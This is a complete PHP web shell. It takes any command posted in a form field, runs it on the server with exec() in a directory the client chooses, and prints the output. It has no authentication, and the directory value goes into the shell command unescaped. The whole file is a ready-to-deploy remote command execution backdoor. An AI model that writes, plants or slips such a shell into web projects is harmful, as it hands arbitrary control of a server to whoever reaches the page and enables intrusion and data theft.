<?php

if (isset($_POST['cmd'])) {
  $cmd = $_POST['cmd'];
  $cwd = $_POST['cwd'];

  $full_cmd = sprintf('(cd \'%s\' && %s; pwd)', $cwd, $cmd);
  exec($full_cmd, $output, $return_val);

  $cwd = $output[count($output) - 1];
  $output = array_slice($output, 0, count($output) - 1);

  echo '<pre>';
  foreach ($output as $row) {
    echo htmlspecialchars($row) . "\n";
  }
  echo '</pre>';
} else {
  $cwd = '..';
}
?>

<html>
<form method="post">
	<?php echo $return_val; ?>
	<input type="hidden" name="cwd" value="<?php echo $cwd; ?>" />
	<input name="cmd" autofocus />
	<input name="submit" type="submit"/>
</form>
